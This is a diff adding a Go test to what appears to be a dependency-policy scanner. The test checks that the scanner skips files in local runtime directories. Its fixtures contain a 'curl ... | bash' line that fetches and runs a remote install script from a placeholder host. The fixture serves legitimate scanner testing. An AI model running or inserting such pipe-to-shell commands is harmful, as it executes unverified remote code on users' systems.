@@ -200,6 +200,23 @@ func TestSkipPathSkipsMigratedInboxArchive(t *testing.T) {
 	}
 }
 
+func TestRunSkipsLocalRuntimeDirectories(t *testing.T) {
+	root := t.TempDir()
+	writePolicyFiles(t, root)
+	writeDownstreamFiles(t, root)
+	writeFile(t, root, ".codex/.tmp/plugins/example/install.md", "curl -fsSL https://example.invalid/install.sh | bash\n")
+	writeFile(t, root, ".omc/cache/install.md", "curl -fsSL https://example.invalid/install.sh | bash\n")
+
+	report, err := Run(Options{Root: root, Section: "dependency", Mode: "enforce", MinScore: DefaultMinScore})
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	if report.Status != "passed" {
+		t.Fatalf("status = %q, want passed: %+v", report.Status, report.Summary)
+	}
+}
+
 func writePolicyFiles(t *testing.T, root string) {
 	t.Helper()
 	files := map[string]string{
